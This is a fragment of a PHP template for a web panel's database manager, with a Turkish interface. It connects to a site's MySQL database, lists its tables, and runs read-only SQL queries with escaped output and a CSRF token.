    <div class="alert alert-info">Sadece SELECT, SHOW, DESCRIBE, EXPLAIN sorgulari calistirilabilir (guvenlik).</div>
    <?php if ($wp_sites): ?>
    <div style="margin-bottom:12px;display:flex;gap:6px;flex-wrap:wrap">
    <?php foreach ($wp_sites as $s): ?>
        <a href="?action=db_manager&wp_path=<?= urlencode($s) ?>" class="btn btn-sm"><?= basename($s) ?> DB</a>
    <?php endforeach; ?></div>
    <?php endif; ?>
    <div class="site-card">
        <form method="GET" style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
            <input type="hidden" name="action" value="db_manager">
            <div style="flex:1;min-width:150px"><label style="font-size:12px">Host</label><input type="text" name="db_host" value="<?= htmlspecialchars($host) ?>" placeholder="localhost"></div>
            <div style="flex:1;min-width:150px"><label style="font-size:12px">Kullanici</label><input type="text" name="db_user" value="<?= htmlspecialchars($user) ?>"></div>
            <div style="flex:1;min-width:150px"><label style="font-size:12px">Veritabani</label><input type="text" name="db_name" value="<?= htmlspecialchars($db) ?>"></div>
        </form>
        <?php if (!$pass): ?>
        <form method="POST" style="display:flex;gap:8px;align-items:end">
            <input type="hidden" name="_token" value="<?= sm_token() ?>">
            <div style="flex:1"><label style="font-size:12px">Sifre</label><input type="password" name="db_pass"></div>
            <button type="submit" class="btn btn-primary">Baglan</button>
        </form>
        <?php endif; ?>
    </div>
    <?php if ($host && $user && $db && $pass):
        $pdo = sm_db_connect($host, $user, $pass, $db);
        if (is_string($pdo)): ?>
        <div class="alert alert-error">Baglanti hatasi: <?= htmlspecialchars($pdo) ?></div>
        <?php else:
            $tables = sm_db_tables($pdo);
        ?>
        <div class="alert alert-success">Baglanti basarili. <?= count($tables) ?> tablo bulundu.</div>
        <div style="display:flex;gap:12px;margin-bottom:16px;flex-wrap:wrap">
            <?php foreach ($tables as $t): ?>
            <a href="?action=db_manager&db_host=<?= urlencode($host) ?>&db_user=<?= urlencode($user) ?>&db_name=<?= urlencode($db) ?>&sql=<?= urlencode('SELECT * FROM `' . $t . '` LIMIT 50') ?>" class="btn btn-sm"><?= htmlspecialchars($t) ?></a>
            <?php endforeach; ?>
        </div>
        <form method="GET" style="margin-bottom:16px"><input type="hidden" name="action" value="db_manager">
            <input type="hidden" name="db_host" value="<?= htmlspecialchars($host) ?>"><input type="hidden" name="db_user" value="<?= htmlspecialchars($user) ?>"><input type="hidden" name="db_name" value="<?= htmlspecialchars($db) ?>">
            <div class="form-group"><label>SQL Sorgusu</label><textarea name="sql" rows="3" style="font-family:monospace"><?= htmlspecialchars($sql) ?></textarea></div>
            <button type="submit" class="btn btn-primary">Calistir</button>
        </form>
        <?php if ($sql):
            $result = sm_db_query($pdo, $sql);
            if (isset($result['error'])): ?>
            <div class="alert alert-error"><?= htmlspecialchars($result['error']) ?></div>
            <?php else: ?>
            <div style="margin-bottom:8px;color:var(--text2);font-size:12px"><?= $result['count'] ?> satir</div>
            <?php if ($result['rows']): ?>
            <div style="overflow-x:auto"><table class="data-table"><thead><tr>
                <?php foreach (array_keys($result['rows'][0]) as $col): ?><th><?= htmlspecialchars($col) ?></th><?php endforeach; ?>
            </tr></thead><tbody>
            <?php foreach ($result['rows'] as $row): ?><tr>
                <?php foreach ($row as $v): ?><td style="max-width:300px;overflow:hidden;text-overflow:ellipsis"><?= htmlspecialchars($v ?? 'NULL') ?></td><?php endforeach; ?>
            </tr><?php endforeach; ?></tbody></table></div>
            <?php endif; endif; endif; endif; endif; ?>
    <?php
}
